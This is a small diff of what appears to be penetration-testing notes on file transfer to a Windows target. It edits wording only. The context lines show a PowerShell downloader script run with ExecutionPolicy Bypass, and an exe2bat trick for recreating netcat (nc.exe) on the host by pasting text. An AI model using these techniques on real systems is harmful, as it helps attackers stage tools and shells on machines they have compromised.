@@ -124,7 +124,7 @@ echo $file = "output-file.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 ```
 
-Now we invoke it with this crazy syntax:
+Now we invoke it with this:
 
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
@@ -157,6 +157,4 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 
 Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
-
-
 
